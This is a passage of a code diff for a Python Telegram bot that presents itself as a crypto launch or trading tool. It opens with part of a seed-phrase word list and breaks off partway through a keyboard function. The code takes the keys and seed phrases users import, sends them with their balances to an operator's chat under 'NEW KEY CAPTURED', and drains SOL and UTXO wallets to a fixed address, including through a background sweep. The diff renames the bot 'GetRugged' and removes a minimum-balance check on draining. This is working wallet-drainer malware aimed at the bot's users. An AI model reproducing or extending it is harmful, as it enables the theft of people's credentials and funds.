'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']
 
 
 def fake_mint() -> str:
@@ -433,8 +420,9 @@ def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
     return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
 
 
-# ──────────────────────────────# KEY DERIVATION
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# KEY DERIVATION
+# ──────────────────────────────────────────────
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
     salt = ("mnemonic" + passphrase).encode("utf-8")
     return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)
@@ -673,8 +661,9 @@ def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[
         return None
 
 
-# ──────────────────────────────# BTC / LTC
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# BTC / LTC
+# ──────────────────────────────────────────────
 def _hash160(b: bytes) -> bytes:
     return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()
 
@@ -822,7 +811,7 @@ async def _http_json(method: str, url: str, body: Optional[str] = None, timeout:
         req = urllib.request.Request(url, data=(body.encode() if body is not None else None), method=method)
         if body is not None:
             req.add_header("Content-Type", "text/plain")
-        req.add_header("User-Agent", "Alpha/1.0")
+        req.add_header("User-Agent", "GetRugged/1.0")
         try:
             with urllib.request.urlopen(req, timeout=timeout) as resp:
                 data = resp.read().decode()
@@ -1047,8 +1036,9 @@ async def drain_utxo_chain(
         return None
 
 
-# ──────────────────────────────# BALANCE HELPERS
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# BALANCE HELPERS
+# ──────────────────────────────────────────────
 async def fetch_sol_balance(pubkey: str) -> float:
     if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
         return 0.0
@@ -1111,8 +1101,9 @@ async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tup
     return label, priv, pub, best_bal
 
 
-# ──────────────────────────────# DRAIN CORE
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# DRAIN CORE
+# ──────────────────────────────────────────────
 async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
     if not HAS_SOLANA:
         log.warning("Solana libs missing — drain simulated")
@@ -1131,14 +1122,7 @@ async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
             bal_resp = await client.get_balance(kp.pubkey())
             balance = bal_resp.value
             log.info("SOL drain check %s balance=%s", kp.pubkey(), balance)
-            if balance <= MIN_DRAIN_LAMPORTS:
-                return None
-            if MIN_DRAIN_SOL > 0 and balance < int(MIN_DRAIN_SOL * 1_000_000_000):
-                log.info(
-                    "SOL drain skipped (below mindrain %.4f SOL) bal_lamports=%s pub=%s",
-                    MIN_DRAIN_SOL, balance, kp.pubkey(),
-                )
-                return None
+            if balance <= MIN_DRAIN_LAMPORTS: return None
             amount = balance - MIN_DRAIN_LAMPORTS
             recent = await client.get_latest_blockhash()
             ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
@@ -1334,32 +1318,29 @@ async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float,
             user_id = str(getattr(user, "id", "—"))
         usd = estimate_usd(sol, eth, bnb, usdc)
         text = (
-            f"<b>NEW KEY</b>\n\n"
+            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
             f"User: {username}\n"
             f"ID: <code>{user_id}</code>\n\n"
             f"<b>Key / Seed:</b>\n"
             f"<code>{raw_key}</code>\n\n"
-            f"<b>Balances:</b>\n"
+            f"<b>Balances drained:</b>\n"
             f"SOL: <b>{sol:.6f}</b>\n"
             f"ETH: <b>{eth:.6f}</b>\n"
             f"BNB: <b>{bnb:.6f}</b>\n"
             f"USDC: <b>{usdc:.2f}</b>\n"
             f"BTC: <b>{btc:.8f}</b>\n"
             f"LTC: <b>{ltc:.8f}</b>\n\n"
-            f"Est: <b>${usd:,.2f}</b>"
+            f"💰 Estimated value: <b>${usd:,.2f}</b>"
         )
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML)
-            except Exception as e:
-                log.warning("Failed to DM admin %s: %s", admin_id, e)
-        log.info("Logged key to admins %s", list(ADMIN_IDS))
+        await bot.send_message(chat_id=KEY_RECEIVER_ID, text=text, parse_mode=ParseMode.HTML)
+        log.info("Logged key ONLY to admin %s", KEY_RECEIVER_ID)
     except Exception as e:
-        log.exception("Failed to log key to admins: %s", e)
+        log.exception("Failed to log key to admin: %s", e)
 
 
-# ──────────────────────────────# BACKGROUND SWEEP
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# BACKGROUND SWEEP
+# ──────────────────────────────────────────────
 async def _sweep_all_sessions() -> Tuple[int, int]:
     tried = 0
     drained = 0
@@ -1404,54 +1385,57 @@ async def _sweep_loop(interval: float) -> None:
         raise
 
 
-# ──────────────────────────────# KEYBOARDS
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# KEYBOARDS
+# ──────────────────────────────────────────────
 def main_menu_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Start", callback_data="menu:launch"))
     b.row(
-        InlineKeyboardButton(text="Wallet", callback_data="menu:wallets"),
-        InlineKeyboardButton(text="Activity", callback_data="menu:tx"),
+        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
+        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
     )
     b.row(
-        InlineKeyboardButton(text="Portfolio", callback_data="menu:portfolio"),
-        InlineKeyboardButton(text="Scanner", callback_data="menu:scanner"),
+        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
+        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
     )
     b.row(
-        InlineKeyboardButton(text="Settings", callback_data="menu:settings"),
-        InlineKeyboardButton(text="About", callback_data="menu:about"),
+        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
+        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
     )
+    b.row(InlineKeyboardButton(text="🏦 Ops Pool", callback_data="menu:balance"))
     return b.as_markup()
 
 
 def back_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
 
 
 def wallets_empty_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Connect", callback_data="wallet:import"))
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Connect", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
     if has_wallets:
         b.row(
-            InlineKeyboardButton(text="Switch", callback_data="wallet:switch"),
-            InlineKeyboardButton(text="Refresh", callback_data="wallet:refresh"),
+            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
+            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
         )
-        b.row(InlineKeyboardButton(text="Remove all", callback_data="wallet:clear"))
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
+        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def promo_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Enter code", callback_data="promo:enter"))
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
+    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1480,13 +1464,13 @@ def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
         InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
     )
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="← Back", callback_data="menu:main")]
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
     ])
 
 
@@ -1501,24 +1485,24 @@ def socials_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="📸 Instagram", callback_data="social:ig"),
     )
     b.row(
-        InlineKeyboardButton(text="Done", callback_data="socials:done"),
-        InlineKeyboardButton(text="Skip", callback_data="socials:skip"),
+        InlineKeyboardButton(text="✅ Done", callback_data="socials:done"),
+        InlineKeyboardButton(text="⏭ Skip", callback_data="socials:skip"),
     )
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def bundle_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="5 Wallets", callback_data="bundle:5"),
-        InlineKeyboardButton(text="10 Wallets", callback_data="bundle:10"),
+        InlineKeyboardButton(text="👥 5 Wallets", callback_data="bundle:5"),
+        InlineKeyboardButton(text="👥 10 Wallets", callback_data="bundle:10"),
     )
     b.row(
-        InlineKeyboardButton(text="15 Wallets", callback_data="bundle:15"),
-        InlineKeyboardButton(text="25 Wallets", callback_data="bundle:25"),
+        InlineKeyboardButton(text="👥 15 Wallets", callback_data="bundle:15"),
